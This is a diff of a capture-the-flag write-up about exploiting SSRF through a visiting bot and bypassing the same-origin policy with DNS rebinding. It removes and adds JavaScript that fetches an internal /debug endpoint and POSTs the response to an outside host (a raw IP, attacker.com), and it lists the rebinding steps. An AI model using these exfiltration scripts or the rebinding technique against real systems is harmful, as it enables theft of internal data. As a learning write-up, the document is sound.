@@ -42,25 +42,51 @@ This is clearly SSRF, but we can't see the output of the response, so we also ne
 So then my next thought was to submit a URL I control.
 The URL will contain a webpage that contains a script that will make a request to the `/debug` endpoint, and then submit the response from that request back to my own web server.
 
-I hosted a web page on an EC2 instance, and had the following page:
+I hosted a web page on an EC2 instance, and had the following script run on it:
 
-```html
-<html>
-    <script>
-        setTimeout(() => {
-            fetch('http://localhost/debug', { method: 'GET' }).then(response => {
-                    return response.text();
-            }).then(data => {
-                    setTimeout(() => {
-                            fetch('http://54.242.152.96/exfil', {
-                                    method: 'POST',
-                                    body: data
-                            });
-                    }, 1500);
-                })
-        }, 1500);
-    </script>
-</html>
+```javascript
+function fetchData() {
+  return fetch('http://localhost/debug')
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      return response.text(); // Return the response as text
+    })
+    .catch(error => {
+      console.error('Error fetching data:', error);
+    });
+}
+
+// Function to send a POST request to `http://attacker.com/` with the fetched data after a delay of 3 seconds
+function sendDataWithDelay(data) {
+  setTimeout(() => {
+    fetch('http://attacker.com/', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'text/plain'
+      },
+      body: data
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      console.log('Data sent successfully');
+    })
+    .catch(error => {
+      console.error('Error sending data:', error);
+    });
+  }, 3000); // Delay of 3 seconds (3000 milliseconds)
+}
+
+// Usage: Fetch data and then send it after a delay of 3 seconds
+fetchData()
+  .then(data => {
+    if (data) {
+      sendDataWithDelay(data);
+    }
+  });
 ```
 
 This somewhat worked, but I wasn't able to receive the request to exfil.
@@ -94,7 +120,7 @@ app.use((req, res, next) => {
 });
 ```
 
-I couldn't find anything to indicate what the CORS policy was so I assumed it was as strict as possible.
+I couldn't find anything to indicate what the CORS policy was so I assumed it was set as the default Same Origin Policy.
 My testing also implied this, so now is the time to think of how to bypass it.
 
 ### CORS
@@ -110,6 +136,37 @@ This header can have multiple values to specify multiple domains, or a wildcard 
 It makes sense too because a site that holds private information probably doesn't want to share information to applications outside of its domain.
 Anyways, there are 2 parts to CORS.
 There is a preflight request that happens from the client to the web server to ensure that the cross-site request is allowed, and then the actual request.
+However these only happen when non-standard requests are made I think, or when you need to read the headers or data of the response (TODO: Verify this)
 
+### SOP
 
+Same Origin Policy is similar to CORS, but it is enforced by the browser.
+This policy just makes it so that a client can only request resources from the same origin, that is the same: **protocal**, **domain**, and **port**.
+For example: a request from https://foo.com to http://foo.com wouldn't work because there is a different protocol between the two addresses.
 
+### Bypass
+
+So the problem here is that our site, lets call it `http://attacker.com` is trying to make a request to `http://localhost/debug`, but because the domain, and the port are different then the request is not allowed by the bot's browser.
+
+And our goal is for the bot to visit our page, our page sends a request to the local server address of the challenge site, and then our page posts that request to us at another endpoint.
+
+![The problem becomes obvious](img/7.png)
+
+Enter DNS Rebind.
+While searching for bypasses on hacktricks, I came across this method.
+The attack relies on changing the IP address for a domain quickly (rebinding it), very quickly, sort of like a race condition.
+How does that help us here?
+Well in the source code for the bot, we can see that it doensn't perform all its actions immediately, there are delays.
+So the problem is that the client is making a request to `http://localhost/debug` from `http://attacker.com`, which gets blocked.
+But what if during the delay between the bot visiting the attacker site, and then timing out, we rebind the address for `http://attacker.com` to instead point to `127.0.0.1`?
+
+1. So the bot visits `http://attacker.com`, which will resolve to our real address (lets say it is `1.3.3.7`).
+2. We rebind `http://attacker.com` to `127.0.0.1`, WHILE the bot still has the page loaded in their browser.
+3. Then our script will run, and will send a request to `http://attacker.com/debug`, which is now actually `http://127.0.0.1/debug`, successfully grabbing the environment data that we need.
+4. Then we make a post request to `http://1.3.3.7/exfil` containing the response to `http://attacker.com/debug` (actually `http://127.0.0.1/debug`), (and we set our CORS policy to allow requests from any domain), which successfully exfils the data to us.
+
+A key element to making this attack work is having a low TTL on the DNS response, so the browser is forced to ask for the address twice.
+
+I decided to use this [dns rebind site](https://lock.cmpxchg8b.com/rebinder.html) to facilitate the attack.
+The first address will be that of my EC2 instance, and the second will be `127.0.0.1`.
+Then we just need to run the attack a few times until we get the elements to line up properly.
